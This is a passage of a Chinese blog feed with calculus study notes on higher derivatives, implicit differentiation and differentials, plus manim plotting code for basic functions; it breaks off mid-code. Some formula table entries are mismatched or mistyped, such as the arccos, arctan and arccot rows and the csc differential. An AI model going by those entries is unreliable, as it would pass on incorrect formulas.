href="#直接求导" class="headerlink" title="直接求导"></a>直接求导</h4><div class="table-container"><table><thead><tr><th>常用公式</th></tr></thead><tbody><tr><td>$\left(e^{\lambda x}\right)^{(n)} = \lambda^{n} e^{\lambda x}$</td></tr><tr><td>$(\sin w x)^{(n)}=w^{n} \sin \left(w x+n \cdot \frac{\pi}{2}\right)$</td></tr><tr><td>$(\cos w x)^{(n)}=w^{n} \cos \left(w x+n \cdot \frac{\pi}{2}\right)$</td></tr><tr><td>$[\ln (1+x)]^{(n)}=\frac{(-1)^{n-1}(n-1) !}{(1+x)^{n}} \quad(x&gt;-1)$</td></tr><tr><td>$\left(\frac{1}{x+1}\right)^{(n)}=\frac{(-1)^{n} n !}{(x+1)^{n+1}}$</td></tr><tr><td>$\left(\frac{1}{a x+b}\right)^{(n)}=\frac{(-1)^{n} n ! a^{n}}{(a x+b)^{n+1}} \quad(a \neq 0)$</td></tr><tr><td>$\left( a^x \right) ^{\left( n \right)}=a^x\ln ^na$</td></tr><tr><td>$\left( \log _ax \right) ^{\left( n \right)}=\frac{\left( -1 \right) ^{n-1}\left( n-1 \right) !}{x^n\ln a}$</td></tr></tbody></table></div><h4 id="间接法"><a href="#间接法" class="headerlink" title="间接法"></a>间接法</h4><div class="table-container"><table><thead><tr><th>运算法则</th></tr></thead><tbody><tr><td>$(u \pm v)^{(n)}=u^{(n)} \pm v^{(n)}$</td></tr><tr><td>$(C u)^{(n)}=C u^{(n)} \quad(C \in R)$</td></tr><tr><td>$(u v)^{(n)}=\sum<em>{k=0}^{n} \mathrm{C}</em>{n}^{k} u^{(n-k)} v^{(k)}$</td></tr></tbody></table></div><h3 id="隐函数"><a href="#隐函数" class="headerlink" title="隐函数"></a>隐函数</h3><p><strong>隐函数</strong>是由隐式方程所隐含定义的函数，比如${\displaystyle y={\sqrt {1-x^{2}}}}$是由${\displaystyle x^{2}+y^{2}-1=0}$确定的函数。而可以直接用含自变量的算式表示的函数称为显函数，也就是通常所说的函数，如${\displaystyle y=\cos(x)}$。</p><p>其中${\displaystyle y={\sqrt {1-x^{2}}}}$是<strong>显函数</strong>，${\displaystyle x^{2}+y^{2}-1=0}$是<strong>隐函数</strong></p><h3 id="隐函数求导"><a href="#隐函数求导" class="headerlink" title="隐函数求导"></a>隐函数求导</h3><p>步骤：</p><ul><li>把$y$变成$y(x)$</li><li>两边对$x$求导</li><li>解出$y^{\prime}$</li></ul><p>例子:</p><p>$\mathrm{e}^{y}+x y-\mathrm{e} = 0 \ \hookrightarrow<br>e^{y(x)}+x \cdot y(x)-e=0 \ \hookrightarrow<br>e^{y} \cdot y^{\prime}+y+x \cdot y^{\prime}=0 \ \hookrightarrow<br>y^{\prime}=-\frac{y}{x+e^{y}} \quad\left(x+e^{y} \neq 0\right)$</p><h2 id="微分"><a href="#微分" class="headerlink" title="微分"></a>微分</h2><div class="note success modern"><p>计算导数的方法就叫微分学。</p></div><p>微分学主要研究的是在函数自变量变化时如何确定函数值的瞬时变化率（导数或微商）。</p><h3 id="微分的几何意义"><a href="#微分的几何意义" class="headerlink" title="微分的几何意义"></a>微分的几何意义</h3><h3 id="微分的概念"><a href="#微分的概念" class="headerlink" title="微分的概念"></a>微分的概念</h3><p>一个正方形金属薄片边长是$x$，受热膨胀了边长增加了$\Delta x$。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/11.png" alt="10"></p><p>膨胀后的总面积面积其表达式为：$y_0=f(x+\Delta x)=(x+\Delta x)^{2}=x^{2}+2 x \cdot \Delta x+(\Delta x)^{2}$</p><p>原始的正方形的面积$y$与其边长$x$的关系是<strong>绿色的区域</strong>：$y={\displaystyle f(x)}=x^2$</p><p>膨胀后的新增加的面积是<strong>红色的区域</strong>（两个长方形+一个小正方形）：$\Delta y=f(x+\Delta x)-f(x)=(x+\Delta x)^{2}-x^2=2x\cdot \Delta x+(\Delta x)^{2}$</p><p>当增量$\Delta x$非常非常小，以至于$\Delta x \to0$时，相应的$(\Delta x)^2$：$\lim_{\Delta x \to 0} {\frac {(\Delta x)^{2} } {\Delta x} }=0$，即$(\Delta x)^2=o(\Delta x)$</p><p>那么面积$\Delta y$可以用$\Delta x$的一次函数（$2x\cdot \Delta x$）近似代替，误差为$(\Delta x)^2$<br><div class="note info modern"><p>结论：函数的增量=自变量增量的一次函数+o(自变量增量)</p><p>函数的增量≈自变量增量的一次函数</p></div></p><p>我们把$\Delta x \to0$时的$\Delta x$和$\Delta y$写作$\mathrm{~d}x$和$\mathrm{~d}x$，则新增的<strong>红色的区域</strong>可以写作：</p><p>$\mathrm{~d} y=2 x \cdot \mathrm{~d} x+(\mathrm{~d} x)^{2}=2 x \cdot \mathrm{~d} x+o(\mathrm{~d} x)$</p><p>把$\mathrm{~d} x$的高阶无穷小项$o(\mathrm{~d} x)$略去，只留主部，如下：</p><p>$\mathrm{~d} y=2 x \cdot \mathrm{~d} x$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/12.png" alt="11"></p><div class="note success modern"><p>所以函数的微分表达式可以表示为：</p><p>$\mathrm{~d} y={\displaystyle f^{\prime}(x)}\cdot \mathrm{~d} x$</p><p>并且没有声明的时候$\mathrm{~d} x$可以直接换成$\Delta x$</p></div><h3 id="基本初等函数求导公式和微分公式对照表"><a href="#基本初等函数求导公式和微分公式对照表" class="headerlink" title="基本初等函数求导公式和微分公式对照表"></a>基本初等函数求导公式和微分公式对照表</h3><div class="table-container"><table><thead><tr><th>导数公式</th><th>微分公式</th></tr></thead><tbody><tr><td>$\left(x^{\mu}\right)^{\prime}=\mu x^{\mu-1}$</td><td>$\mathrm{~d}\left(x^{\mu}\right)=\mu x^{\mu-1} \cdot \mathrm{~d} x$</td></tr><tr><td>$(\sin x)^{\prime}=\cos x$</td><td>$\mathrm{~d}(\sin x)=\cos x \cdot \mathrm{~d} x$</td></tr><tr><td>$(\cos x)^{\prime}=-\sin x$</td><td>$\mathrm{~d}(\cos x)=-\sin x \cdot \mathrm{~d} x$</td></tr><tr><td>$(\tan x)^{\prime}=\sec ^{2} x$</td><td>$\mathrm{~d}(\tan x)=\sec ^{2} x \cdot \mathrm{~d} x$</td></tr><tr><td>$(\cot x)^{\prime}=-\csc ^{2} x$</td><td>$\mathrm{~d}(\cot x)=-\csc ^{2} x \cdot \mathrm{~d} x$</td></tr><tr><td>$(\sec x)^{\prime}=\sec x \tan x$</td><td>$\mathrm{~d}(\sec x)=\sec x \tan x \cdot \mathrm{~d} x$</td></tr><tr><td>$(\csc x)^{\prime}=-\csc x \cot x$</td><td>$\mathrm{~d}(\csc x)=-\csc \cot x \cdot \mathrm{~d} x$</td></tr><tr><td>$\left(a^{x}\right)^{\prime}=a^{x} \ln a \quad (a&gt;0 \text { 且 } a \neq 1)$</td><td>$\mathrm{~d}\left(a^{x}\right)=a^{x} \ln a \cdot \mathrm{~d} x \quad (a&gt;0 \text { 且 } a \neq 1)$</td></tr><tr><td>$\left(\mathrm{e}^{x}\right)^{\prime}=\mathrm{e}^{x}$</td><td>$\mathrm{~d}\left(\mathrm{e}^{x}\right)=\mathrm{e}^{x} \cdot \mathrm{~d} x$</td></tr><tr><td>$\left(\log { }_{a} x\right)^{\prime}=\frac{1}{x \ln a} \quad (a&gt;0 \text { 且 } a \neq 1)$</td><td>$\mathrm{~d}(\log x)=\frac{1}{x \ln a} \cdot \mathrm{~d} x \quad (a&gt;0 \text { 且 } a \neq 1)$</td></tr><tr><td>$(\ln x)^{\prime}=\frac{1}{x}$</td><td>$\mathrm{~d}(\ln x)=\frac{1}{x} \cdot \mathrm{~d} x$</td></tr><tr><td>$(\arcsin x)^{\prime}=\frac{1}{\sqrt{1-x^{2}}}$</td><td>$\mathrm{~d}(\arcsin x)=\frac{1}{\sqrt{1-x^{2}}} \cdot \mathrm{~d} x$</td></tr><tr><td>$(\arccos x)^{\prime}=-\frac{1}{\sqrt{1-x^{2}}} \cdot \mathrm{~d} x$</td><td>$\mathrm{~d}(\operatorname{arccot} x)=-\frac{1}{1+x^{2}} \cdot \mathrm{~d} x$</td></tr><tr><td>$(\arctan x)^{\prime}=\frac{1}{1+x^{2}}$</td><td>$\mathrm{~d}(\arccos x)=-\frac{1}{\sqrt{1-x^{2}}} \cdot \mathrm{~d} x$</td></tr><tr><td>$(\operatorname{arccot} x)^{\prime}=-\frac{1}{1+x^{2}}$</td><td>$\mathrm{~d}(\operatorname{arccot} x)=-\frac{1}{1+x^{2}} \cdot \mathrm{~d} x$</td></tr></tbody></table></div><h3 id="函数和、差、积、商求导法则与微分法则对照表"><a href="#函数和、差、积、商求导法则与微分法则对照表" class="headerlink" title="函数和、差、积、商求导法则与微分法则对照表"></a>函数和、差、积、商求导法则与微分法则对照表</h3><div class="table-container"><table><thead><tr><th>函数和、差、积、商的求导法则</th><th>函数和、差、积、商的微分法则</th></tr></thead><tbody><tr><td>$(u \pm v)^{\prime}=u^{\prime} \pm v^{\prime}$</td><td>$\mathrm{~d}(u \pm v)=(u \pm v)^{\prime} \cdot \mathrm{~d} x=u^{\prime} \cdot \mathrm{~d} x \pm v^{\prime} \cdot \mathrm{~d} x=\mathrm{~d} u \pm \mathrm{~d} v$</td></tr><tr><td>$(\mathrm{C} u)^{\prime}=\mathrm{C} u^{\prime}$</td><td>$\mathrm{~d}(\mathrm{C} u)=(\mathrm{C} u)^{\prime} \mathrm{~d} x=\mathrm{C} u^{\prime} \cdot \mathrm{~d} x=\mathrm{C} \cdot \mathrm{~d} u$</td></tr><tr><td>$(u v)^{\prime}=u^{\prime} v+u v^{\prime}$</td><td>$\mathrm{~d}(u v)=(u v)^{\prime} \cdot \mathrm{~d} x=\left(u^{\prime} v+u v^{\prime}\right) \cdot \mathrm{~d} x=u^{\prime} v \cdot \mathrm{~d} x+u v^{\prime} \cdot \mathrm{~d} x=v \cdot \mathrm{~d} u+u \cdot \mathrm{~d} v$</td></tr><tr><td>$\left(\frac{u}{v}\right)^{\prime}=\frac{u^{\prime} v-u v^{\prime}}{v^{2}} \quad(v \neq 0)$</td><td>$\mathrm{~d}\left(\frac{u}{v}\right)=\left(\frac{u}{v}\right)^{\prime} \cdot \mathrm{~d} x=\frac{u^{\prime} v-u v^{\prime}}{v^{2}} \cdot \mathrm{~d} x=\frac{v \cdot \mathrm{~d} u-u \cdot \mathrm{~d} v}{v^2} \quad(v \neq 0)$</td></tr></tbody></table></div><h3 id="复合函数-1"><a href="#复合函数-1" class="headerlink" title="复合函数"></a>复合函数</h3><p>设$y=f(u)$及$u=g(x)$都可导, 则复合函数$y=f[g(x)]$的微分为</p><p>$\mathrm{~d} y=y_{x}^{\prime} \mathrm{~d} x=f^{\prime}(u) g^{\prime}(x) \mathrm{~d} x$</p><p>由于  $g^{\prime}(x) \mathrm{~d} x=\mathrm{~d} u$, 所以, 复合函数$y=f[g(x)]$的微分公式也可以写成</p><p>$\mathrm{~d} y=f^{\prime}(u) \mathrm{~d} u$或$\mathrm{~d} y=y_{u}^{\prime} \mathrm{~d} u$</p><h3 id="近似公式"><a href="#近似公式" class="headerlink" title="近似公式"></a>近似公式</h3><div class="table-container"><table><thead><tr><th>常用近似公式</th></tr></thead><tbody><tr><td>$\sqrt[n]{1+x} \approx 1+\frac{1}{n} x$</td></tr><tr><td>$\sin x \approx x$</td></tr><tr><td>$\tan x \approx x$</td></tr><tr><td>$e^{x} \approx 1+x$</td></tr><tr><td>$\ln (1+x) \approx x$</td></tr></tbody></table></div>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>函数与映射</title>
    <link href="https://www.ascotbe.com/2022/12/07/FurtherMathematics_0x01/"/>
    <id>https://www.ascotbe.com/2022/12/07/FurtherMathematics_0x01/</id>
    <published>2022-12-07T15:58:53.000Z</published>
    <updated>2023-03-13T06:23:39.110Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_1.jpg" alt="0_1"></p><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><p>定义：$X$、$Y$ 非空集合, 法则 $f$ , 对 $X$ 中每个元素 $x$  。唯一的$y$  与之对应, $f: X \rightarrow Y$</p><p>三要素：$X$ 原像、$f$ 映射、$R_{f}$ 值域</p><p>$x \in X$对应的$y$是唯一的 , $R<em>{f} \subset Y R</em>{f} \neq Y$</p><div class="table-container"><table><thead><tr><th>名称</th><th>满足条件</th></tr></thead><tbody><tr><td>满射</td><td>$R_{f} =  Y$</td></tr><tr><td>单射</td><td>$x<em>{1} \neq x</em>{2}, f\left(x<em>{1}\right) \neq f\left(x</em>{2}\right)$</td></tr><tr><td>一一映射</td><td>既是单射又是满射</td></tr><tr><td>逆映射</td><td>设$f: X \rightarrow Y$ 单射 , 每个 $y \in R_{f}$  都有唯一的 $x \in X$</td></tr><tr><td>复合映射</td><td>$f[g(x)]$</td></tr></tbody></table></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的概念"><a href="#函数的概念" class="headerlink" title="函数的概念"></a>函数的概念</h3><p>定义：设数集$  D \subset \mathbf{R}$ , 则称映射$ f: D \rightarrow \mathbf{R}$ 为定义在$ D$ 上的函数记为$ \underline {y=f(x), x \in D}$</p><p>其中$x$称为自变量,$y$称为因变量, $D$ 称为定义域,记作$D<em>{f}$ ,  即$D</em>{f}=D$</p><h4 id="常值函数"><a href="#常值函数" class="headerlink" title="常值函数"></a>常值函数</h4><p>$y=2,  x \in ( -\infty,+\infty)$</p><p>定义域：$(-\infty,+\infty)$   值域：${2}$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#常值函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># x_min must be &gt; 0 because log is undefined at 0.</span></span><br><span class="line">        graph = ax.plot(<span class="keyword">lambda</span> x: <span class="number">2</span>, x_range=[-<span class="number">2</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line"></span><br><span class="line">        line_graph = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )</span><br><span class="line">        sin_label = ax.get_graph_label(</span><br><span class="line">            graph, <span class="string">&quot;y=2&quot;</span>, x_val=<span class="number">2</span>,direction=UP/<span class="number">1</span> , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph,line_graph,sin_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/1.png" alt="output_4_0"><br>​    </p><h4 id="绝对值函数"><a href="#绝对值函数" class="headerlink" title="绝对值函数"></a>绝对值函数</h4><p>$\begin{align}<br>y &amp; = |x| = \left{\begin{array}{lc}<br>-x, &amp; x&lt;0, \<br>x, &amp; x \geqslant 0<br>\end{array}\right.<br>\end{align}$</p><p>定义域：$(-\infty,+\infty)$   值域：$R_{f}=[0,+\infty)$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#绝对值函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[<span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># x_min must be &gt; 0 because log is undefined at 0.</span></span><br><span class="line">        graph = ax.plot(<span class="keyword">lambda</span> x: <span class="built_in">abs</span>(x), x_range=[-<span class="number">2</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># line_graph = ax.plot_line_graph(</span></span><br><span class="line">        <span class="comment">#     x_values = [0],</span></span><br><span class="line">        <span class="comment">#     y_values = [2],</span></span><br><span class="line">        <span class="comment">#     line_color=GOLD_E,</span></span><br><span class="line">        <span class="comment">#     vertex_dot_style=dict(stroke_width=3,  fill_color=PURPLE),</span></span><br><span class="line">        <span class="comment">#     stroke_width = 4,</span></span><br><span class="line">        <span class="comment"># )</span></span><br><span class="line">        sin_label = ax.get_graph_label(</span><br><span class="line">            graph, <span class="string">&quot;y=|x|&quot;</span>, x_val=<span class="number">2</span>,direction=UP/<span class="number">1</span> , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph,sin_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p>​    <img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/2.png" alt="output_6_0"></p><h4 id="符号函数"><a href="#符号函数" class="headerlink" title="符号函数"></a>符号函数</h4><p>$\begin{align}<br> y &amp; = \operatorname{sgn} x  = \left{\begin{array}{ll}<br>-1, &amp; x<0, \\0, & x & = 0, \\1, & x>0<br>\end{array}\right.<br>\end{align}$</p><p>定义域：$D=(-\infty,+\infty)$   值域：$R_{f}={-1,0,1)$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#符号函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: -<span class="number">1</span>, x_range=[-<span class="number">1</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">0</span>, x_range=[<span class="number">0</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph3 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">1</span>, x_range=[<span class="number">0</span>,<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        x_less_than_zero = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [-<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_equal_zero = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">0</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#等于1</span></span><br><span class="line">        x_more_than_the_zero = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">3</span>,  fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#大于1</span></span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, <span class="string">&quot;y=-1&quot;</span>, x_val=-<span class="number">1</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph2_label = ax.get_graph_label(</span><br><span class="line">            graph2, <span class="string">&quot;y=0&quot;</span>, x_val=<span class="number">0</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph3_label = ax.get_graph_label(</span><br><span class="line">            graph3, <span class="string">&quot;y=1&quot;</span>, x_val=<span class="number">1</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph3,x_less_than_zero,x_equal_zero,x_more_than_the_zero,graph1_label,graph2_label,graph3_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/3.png" alt="output_8_0"></p><p>​    </p><h4 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h4><p>$\begin{align}<br>y &amp; = [x]<br>\end{align}$    </p><p>定义：设$x$为任一实数，不超过$x$的最大整数称为$x$的整数部分</p><p>比如：$[1.03]=1;[0.36]=0;[-1.3]=-2;[3]=3;[\frac{5}{7}]=0$</p><p>定义域：$(-\infty,+\infty)$   值域：$R_{f}=Z$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#取整函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: -<span class="number">2</span>, x_range=[-<span class="number">2</span>,-<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x:  -<span class="number">1</span>, x_range=[-<span class="number">1</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph3 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">0</span>, x_range=[<span class="number">0</span>,<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph4 = ax.plot(<span class="keyword">lambda</span> x: <span class="number">1</span>, x_range=[<span class="number">1</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph5 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">2</span>, x_range=[<span class="number">2</span>,<span class="number">3</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line"></span><br><span class="line">        x_graph1_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [-<span class="number">2</span>],</span><br><span class="line">            y_values = [-<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph1_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [-<span class="number">1</span>],</span><br><span class="line">            y_values = [-<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )        </span><br><span class="line">        x_graph2_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [-<span class="number">1</span>],</span><br><span class="line">            y_values = [-<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph2_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [-<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )</span><br><span class="line">        x_graph3_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">0</span>],</span><br><span class="line">            y_values = [<span class="number">0</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph3_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">1</span>],</span><br><span class="line">            y_values = [<span class="number">0</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )        </span><br><span class="line">        x_graph4_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">1</span>],</span><br><span class="line">            y_values = [<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph4_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">2</span>],</span><br><span class="line">            y_values = [<span class="number">1</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )</span><br><span class="line">        x_graph5_1 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">2</span>],</span><br><span 